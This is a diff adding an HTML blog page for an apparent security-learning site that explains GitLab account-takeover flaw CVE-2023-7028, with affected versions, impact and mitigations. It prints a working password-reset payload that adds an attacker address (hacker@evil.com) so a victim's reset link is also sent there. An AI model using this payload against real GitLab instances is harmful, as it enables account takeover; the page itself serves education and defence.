@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blogs | How To Approach: Cryptography</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Oswald">
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body>
+    <div class="container">
+        <div class="header">CYBERMAZEARENA</div>
+        <div class="theme-switch" data-tooltip="Switch to Light Mode">
+            <div class="switch"></div>
+        </div>
+    </div>
+    <!-- Add the <hr> element with a class based on the theme -->
+    <hr class="hr-light">
+    <div class ="wrapper">
+        <div class="menucontainer">
+        <ul>
+            <li class="list">
+            <a href="{% url 'main' %}">
+                <span class="icon"><i class="fas fa-home"></i></span>
+                <span class="title">Home</span>
+            </a>
+            </li>
+            <li class="list">
+            <a href="#">
+                <span class="icon"><i class="fas fa-user"></i></span>
+                <span class="title">Profile</span>
+            </a>
+            </li>
+            <li class="list">
+                <a href="{% url 'learn' %}">
+                <span class="icon"><i class="fas fa-book"></i></span>
+                <span class="title">Learn</span>
+                </a>
+            </li>
+            <li class="list active">
+                <a href="{% url 'blogs' %}">
+                    <span class="icon"><i class="fas fa-blog"></i></span>
+                    <span class="title">Blogs</span>
+                </a>
+            </li>
+            <li class="list">
+            <a href="#">
+                <span class="icon"><i class="fas fa-circle-question"></i></span>
+                <span class="title">Support</span>
+            </a>
+            </li>
+            <li class="list">
+            <a href="#">
+                <span class="icon"><i class="fas fa-gear"></i></span>
+                <span class="title">Settings</span>
+            </a>
+            </li>
+            <li class="list">
+                <a href="#">
+                <span class="icon"><i class="fas fa-door-open"></i></span>
+                <span class="title">LogOut</span>
+                </a>
+            </li>
+            <div class="indicator"></div>
+        </ul>
+        </div>
+        <div class="content">
+            <div class="info">
+                <h1>Gitlab Vulnerability - CVE-2023-7028 </h1>
+                <p>GitLab is vulnerable to a critical account takeover vulnerability, also known as CVE-2023-7028, which allows unauthenticated attackers to take over any user’s session by providing the victim user’s email address as an additional input during the password reset process.
+                    The vulnerability primarily impacts users who do not have Two-Factor Authentication (2FA) activated or who use self-managed instances.<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/7beb99709421d8a065bdcb3677f12ebb.png" width="16%" height="8%">
+                    GitLab swiftly responded and issued a fix to address the identified issue. According to GitLab’s notification, all vulnerable GitLab instances must be upgraded to the newest version, and users must enable 2FA as an added layer of security.</p>
+                <p>The following versions of GitLab EE/CE are affected by this vulnerability:
+                    <ul class=vers">16.1 to 16.1.5</ul>
+                    <ul class=vers">16.2 to 16.2.8</ul>
+                    <ul class=vers">16.3 to 16.3.6</ul>
+                    <ul class=vers">16.4 to 16.4.4</ul>
+                    <ul class=vers">16.5 to 16.5.5</ul>
+                    <ul class=vers">16.6 to 16.6.3</ul>
+                    <ul class=vers">16.7 to 16.7.1</ul></p>
+                <br>
+                <h3>Working Of This Vulnerability</h3>
+                <p>GitLab is a web-based platform that provides a set of tools for managing source code repositories, facilitating collaboration among developers, and enabling continuous integration/continuous deployment (CI/CD) pipelines. It’s widely used for version control and project management, allowing teams to efficiently collaborate on software development projects.
+                    As GitLab is a web-based platform that interacts with various users, it offers its users the ability to reset and recover their accounts if they lose their passwords. This is the primary region where the vulnerability exists, allowing an attacker to manipulate the password reset process and potentially gain unauthorized access to user accounts, including but not limited to higher-privileged users.
+                    The figure below illustrates the whole attack cycle, explaining how it works and could be used to achieve account takeover.<br>
+                    Now that we have developed a high-level understanding of the vulnerability, let us dive into the more technical aspect of the underlying misconfiguration and understand how the vulnerability works.
+                    The password reset request contains an array that accepts the user’s email address as input, after which the GitLab instance sends a password reset link to the user’s email address to recover the account. However, the platform fails to properly check the user’s input on the server side and sends the user’s password reset link to the attacker-controlled email address when the attacker’s email is provided as an additional email as input.
+                    <br>The affected input field and the payload are described below to develop a better understanding of the vulnerability:<br><br>
+                    <span class="payload"><b>Payload:</b> <i>user[email][]=victim@example.com&user[email][]=hacker@evil.com</i></span><br><br>
+                    user[email][]=: This is the start of the payload, containing the parameter for the email address associated with the GitLab account.<br>
+                    victim@example.com: This is the legitimate email address of the target GitLab account, which the attacker is going to compromise.<br>
+                    hacker@evil.com: This is the attacker’s email address. Injecting this email in the payload allows the attacker to obtain the password reset link of the victim user.</p>
+                    <br>
+                <h3>Impact Of This Vulnerability</h3>
+                <p>The vulnerability impacts the authentication mechanisms of the application. An attacker may modify the password if they obtain the token sent in the email.
+                    The vulnerability originates from a flaw in the email verification process when resetting passwords. An attacker can provide two emails, and the reset code will be sent to both.
+                    It is, therefore, possible to provide the email address of the target account and that of the attacker and reset the administrator password
+                    GitLab uses the supplied email to look for a verified user. If the email consists of a single string, GitLab locates a verified user connected to that string and emails the reset token to that address.
+                    If the email is an array of email addresses, GitLab uses the array to identify a verified user and then sends the reset token to each address in the array. Users with two-factor authentication enabled are vulnerable to password reset but not account takeover, as their second authentication factor is required to log in.</p>
+                <br>
+                <h3>Mitigations and Best Practices</h3>
+                <p>To prevent this vulnerability, the below-mentioned best practices and suggestions should be followed:
+                    <ul>Immediately upgrade your GitLab instance to the latest patched version.</ul>
+                    <ul>Multi-factor authentication should be enabled for all GitLab accounts, especially those with elevated privileges. This ensures that even if an attacker can perform a password reset on users with elevated access, the implemented 2FA will provide an additional layer of security.</ul>
+                    <ul>Self-managed instances of GitLab must be upgraded to the latest version as soon as possible, as GitLab-managed instances have now all the security patches applied to prevent this vulnerability.</ul>
+                    <ul>Review GitLab logs regularly, particularly the itlab-rails/production_json.log and gitlab-rails/audit_json.log, for any unusual behavior associated with password reset attempts.</ul></p>
+            </div>
+            <br><br>
+        </div>
+</body>
+</html>
+
+<style>
+    :root {
+        --background: #333;
+        --text: #FFF;
+        --highlight: #39AC4C;
+    }
+
+    body {
+        font-family: 'Oswald', sans-serif;
+        transition: background-color 0.5s, color 0.5s;
+        background-color: var(--background);
+        color: var(--text);
+        margin: 0;
+        padding: 10px;
+    }
+
+    .container {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 20px;
+    }
+
+    .theme-switch {
+        --background: #FFF;
+        --text: #333;
+        color: var(--text);
+        width: 50px;
+        height: 25px;
+        background: var(--highlight);
+        border-radius: 50px;
+        position: relative;
+        display: flex;
+        align-items: center;
+        cursor: pointer;
+    }
+
+    .theme-switch .switch {
+        background: white;
+        width: 24px;
+        height: 24px;
+        background: var(--background);
+        border-radius: 50%;
+        transition: transform 0.5s ease; /* Adjusted the transition property */
+        transform: translateX(0);
+        position: relative;
+    }
+
+    .theme-switch::before {
+        content: attr(data-tooltip); /* Tooltip text based on the data-tooltip attribute */
+        position: absolute;
+        background: var(--highlight);
+        color: white;
+        padding: 6px;
+        border-radius: 4px;
+        font-size: 14px;
+        top: 100%; /* Position below the button */
+        left: 50%;
+        transform: translateX(-50%);
+        opacity: 0;
+        pointer-events: none; /* Allow button click through */
+        transition: opacity 0.3s, transform 0.3s;
+    }
+
+    .theme-switch:hover::before {
+        opacity: 1;
+        transform: translateX(-50%) translateY(5px);
+    }
+
+    /* Updated class selector */
+    .light-theme .theme-switch .switch {
+        transform: translateX(25px); /* Adjusted the translateX value */
+    }
+
+    body.light-theme {
+        background-color: #FFF !important;
+        color: #000 !important;
+    }
+
+    .header {
+        font-size: 32px;
+        margin: 0;
+    }
+
+    /* Styling for the <hr> tag based on the theme */
+    .hr-light {
+        background-color: #FFF;
+        height: 2px;
+        border: none;
+    }
+
+    .hr-dark {
+        background-color: #333;
+        height: 2px;
+        border: none;
+    }
+
+    .wrapper {
+    display: flex;
+    }
+
+    .content {
+        flex-grow: 1;
+        padding-left: 120px;
+        padding-right: 20px; /* Add padding to the content */
+    }
+
+    .menucontainer ul {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+    }
+
+    .menucontainer {
+        position: fixed;
+        width: 70px;
+        height: 530px;
+        background: #fff;
+        border-radius: 35px;
+        box-shadow: 0px 15px 25px rgba(0, 0, 0, .1);
+        transform: translateY(40px);
+    }
+
+    .menucontainer ul li {
+        position: relative;
+        list-style: none;
+        width: 70px;
+        height: 70px;
+        z-index: 1;
+    }
+
+    .menucontainer ul li a {
+        position: relative;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        color: #333;
+        text-decoration: none;
+    }
+
+    .menucontainer ul li a .icon {
+        display: block;
+        position: relative;
+        line-height: 75px;
+        text-align: center;
+        transition: 0.5s;
+    }
+
+    .menucontainer ul li.active a .icon {
+        color: #fff;
+    }
+
+    .menucontainer ul li a .icon i {
+        font-size: 24px;
+        transition: 0.5s;
+        transform: translateX(-40px);
+    }
+
+    .menucontainer ul li a .title {
+        position: absolute;
+        top: 50%;
+        left: 70px;
+        background: #fff;
+        padding: 5px 10px;
+        transform: translateY(-50%);
+        border-radius: 6px;
+        transition: 0.5s;
+        box-shadow: 0 5px 10px rgba(0, 0, 0, .1);
+        opacity: 0;
+        visibility: hidden;
+    }
+
+    .menucontainer ul li:hover a .title {
+        opacity: 1;
+        visibility: visible;
+        transform: translate(-25px, -58%);
+    }
+
+    .menucontainer ul li:hover a .title::before {
+        content: "";
+        position: absolute;
+        top: 48%;
+        left: -5px;
+        transform: rotate(45deg) translateY(-50%);
+        height: 6px;
+        width: 6px;
+        background: #fff;
+        border-radius: .5px;
+    }
+
+    .menucontainer ul .indicator {
+        position: absolute;
+        left: 0;
+        top: -2px;
+        width: 70px;
+        height: 70px;
+        transition: 0.5s;
+    }
+
+    .menucontainer ul .indicator::before {
+        content: "";
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 50px;
+        height: 50px;
+        background: #333;
+        border-radius: 50%;
+        transition: .5s;
+    }
+
+    .menucontainer ul li:nth-child(1).active ~ .indicator {
+        transform: translateY(calc(70px * 0));
+    }
+
+    .menucontainer ul li:nth-child(2).active ~ .indicator {
+        transform: translateY(calc(70px * 1));
+    }
+
+    .menucontainer ul li:nth-child(3).active ~ .indicator {
+        transform: translateY(calc(70px * 2));
+    }
+
+    .menucontainer ul li:nth-child(4).active ~ .indicator {
+        transform: translateY(calc(70px * 3));
+    }
+
+    .menucontainer ul li:nth-child(5).active ~ .indicator {
+        transform: translateY(calc(70px * 4));
+    }
+
+    body.light-theme .menucontainer {
+    background-color: #333;
+    }
+
+    body.light-theme .menucontainer ul li a {
+        color: #FFF;
+    }
+
+    body.light-theme a {
+        color: black;
+    }
+
+    body.light-theme .menucontainer ul li a .title {
+        background: #333;
+        box-shadow: 0 5px 10px rgba(255, 255, 255, .1);
+    }
+
+    body.light-theme .menucontainer ul .indicator::before {
+        background: #FFF;
+    }
+
+    body.light-theme .menucontainer ul li.active a .icon {
+        color: #333;
+    }
+
+    /* Sidebar styling for light theme (default) */
+    .menucontainer {
+        background: #fff;
+        box-shadow: 0px 15px 25px rgba(0, 0, 0, .1);
+    }
+
+    .menucontainer ul li a {
+        color: #333;
+    }
+
+    .menucontainer ul li a .title {
+        background: #fff;
+        box-shadow: 0 5px 10px rgba(0, 0, 0, .1);
+    }
+
+    .menucontainer ul .indicator::before {
+        background: #333;
+    }
+    
+    .info {
+        font-size: 20px;
+        margin-top: 25px;
+        line-height: 30px;
+    }
+
+    .next {
+        color: white;
+        float: right;
+        padding-right: 30px;
+        font-size: 18px;
+    }
+</style>
+
+<script>
+    const themeSwitch = document.querySelector('.theme-switch');
+    const body = document.body;
+    const hrElement = document.querySelector('hr');
+
+    themeSwitch.addEventListener('click', () => {
+        body.classList.toggle('light-theme');
+        if (body.classList.contains('light-theme')) {
+            themeSwitch.dataset.tooltip = 'Switch to Dark Mode';
+            hrElement.className = 'hr-dark';
+        } else {
+            themeSwitch.dataset.tooltip = 'Switch to Light Mode';
+            hrElement.className = 'hr-light';
+        }
+    });
+</script>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+    const menuContainer = document.querySelector('.menucontainer');
+
+    window.addEventListener('scroll', function() {
+        if (window.scrollY > 0) {
+            menuContainer.classList.add('scrolled');
+        } else {
+            menuContainer.classList.remove('scrolled');
+            // Add a delay before removing the class to ensure the transition is completed
+            setTimeout(() => {
+                menuContainer.style.transition = 'none'; // Disable transition temporarily
+                menuContainer.classList.remove('scrolled');
+                setTimeout(() => {
+                    menuContainer.style.transition = ''; // Restore transition
+                }, 50); // Adjust the delay if needed
+            }, 300); // Adjust the delay to match the transition duration
+        }
+    });
+});
+
+</script>
+
+<style>
+    .menucontainer {
+    transition: transform 0.3s ease; /* Add transition property to menucontainer */
+}
+
+.menucontainer.scrolled {
+    transform: translateY(-20px); /* Adjust the value as needed */
+}
+
+img {
+    position: relative;
+    float: right;
+    margin-right: 50px;
+}
+
+.payload {
+    background-color: #000;
+    padding: 20px;
+    font-weight: -10;
+}
+</style>
